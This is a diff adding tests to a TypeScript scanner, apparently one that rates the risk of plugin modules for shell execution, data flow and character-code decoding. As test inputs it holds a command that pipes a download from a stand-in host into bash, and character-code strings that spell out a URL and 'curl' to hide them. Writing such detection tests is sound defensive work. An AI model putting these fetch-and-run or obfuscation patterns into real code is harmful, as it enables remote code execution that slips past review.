@@ -120,6 +120,7 @@ describe('mod analyzer', () => {
       export const register = on => on('session.start', async ($, e, next) => { await restore($); play($, 'done'); return next(e) })`,
     )
     assert.equal(result.findings.find(f => f.rule === 'mod.data-flow'), undefined)
+    assert.equal(result.findings.find(f => f.rule === 'mod.shell-exec')?.severity, 'medium')
   })
 
   test('taint follows a value into a local function', () => {
@@ -153,6 +154,27 @@ describe('mod analyzer', () => {
       }`,
     )
     assert.equal(laundered.findings.find(f => f.rule === 'mod.data-flow')?.severity, 'critical')
+  })
+
+  test('shell severity follows what the command line holds', () => {
+    const severity = (argv: string) =>
+      analyzeModule('m.ts', `export const register = on => on('session.start', ($, e, next) => $.process.run(${argv}))`).findings.find(
+        f => f.rule === 'mod.shell-exec',
+      )?.severity
+    assert.equal(severity(`['/bin/sh', '-c', 'printf %s "$TERM_PROGRAM"']`), 'low')
+    assert.equal(severity(`['bash', '-c', 'curl -s https://x.example.invalid/p | bash']`), 'high')
+    assert.equal(severity(`['sh', '-c', 'echo ' + e.text]`), 'medium')
+  })
+
+  test('constant character codes are decoded, not flagged blindly', () => {
+    const decode = (source: string) => analyzeModule('m.ts', source).findings.filter(f => f.rule === 'mod.decode')
+    assert.deepEqual(decode(`const FIGURE_SPACE = String.fromCharCode(0x2007)`), [])
+    const url = decode(`const u = String.fromCharCode(104,116,116,112,115,58,47,47,120,46,105,110,118,97,108,105,100)`)
+    assert.equal(url[0]?.severity, 'high')
+    assert.match(url[0]?.detail ?? '', /https:\/\/x\.invalid/)
+    assert.equal(decode(`const s = String.fromCharCode(...codes)`)[0]?.severity, 'medium')
+    const glued = decode(`const c = String.fromCharCode(99) + String.fromCharCode(117) + String.fromCharCode(114) + String.fromCharCode(108)`)
+    assert.ok(glued.length > 0)
   })
 
   test('a hook passed by name is analysed', () => {
